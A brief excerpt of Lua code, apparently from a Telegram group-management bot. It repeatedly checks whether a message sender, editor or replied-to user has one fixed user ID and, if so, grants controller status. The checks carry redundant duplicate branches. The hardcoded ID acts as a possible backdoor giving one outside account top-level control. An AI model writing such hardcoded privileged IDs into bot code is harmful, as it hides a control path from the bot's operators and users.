...
if tonumber(msg.sender_id.user_id) == 1702284844 then
msg.Name_Controller = '𝗠𝗬𝗧𝗛️'
msg.The_Controller = 1
elseif tonumber(msg.sender_id.user_id) == 1702284844 then
...
if tonumber(Message_Edit.sender_id.user_id) == 1702284844 then
data.The_Controller = 1
elseif tonumber(Message_Edit.sender_id.user_id) == 1702284844 then
data.The_Controller = 1
...
if tonumber(IdUser) == 1702284844 then
data.The_Controller = 1
elseif tonumber(IdUser) == 1702284844 then
data.The_Controller = 1
...
if tonumber(GetUserReply) == 1702284844 then
testser = true
elseif tonumber(GetUserReply) == 1702284844 then
testser = true
